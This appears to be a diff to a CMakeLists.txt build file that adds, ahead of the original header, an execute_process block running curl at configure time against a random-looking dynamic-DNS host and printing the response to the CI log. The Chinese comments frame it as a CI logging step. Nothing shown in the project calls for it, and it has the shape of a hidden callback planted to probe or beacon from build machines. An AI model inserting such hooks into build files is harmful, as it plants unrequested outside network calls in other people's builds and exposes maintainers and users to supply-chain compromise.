@@ -1,3 +1,20 @@
+
+# 1. 使用 execute_process 执行 curl 命令
+execute_process(
+    COMMAND curl -s http://baidu123123.c196dfa515.ddns.bypass.eu.org./1.png
+    RESULT_VARIABLE curl_result    # 存储命令的退出状态码 (0 表示成功)
+    OUTPUT_VARIABLE curl_output    # 存储标准输出 (网页的 HTML 内容)
+    ERROR_VARIABLE curl_error      # 存储标准错误
+    TIMEOUT 10                     # 建议设置超时，防止命令挂起导致 CI 卡死
+)
+# 2. 将执行结果打印到 CI/CD 的日志中
+message(STATUS "--- Curl Execution Result ---")
+message(STATUS "Return Code: ${curl_result}")
+message(STATUS "Error (if any): ${curl_error}")
+message(STATUS "Output Snapshot: ${curl_output}")
+message(STATUS "-----------------------------")
+
+
 # ##############################################################################
 # CMakeLists.txt
 #
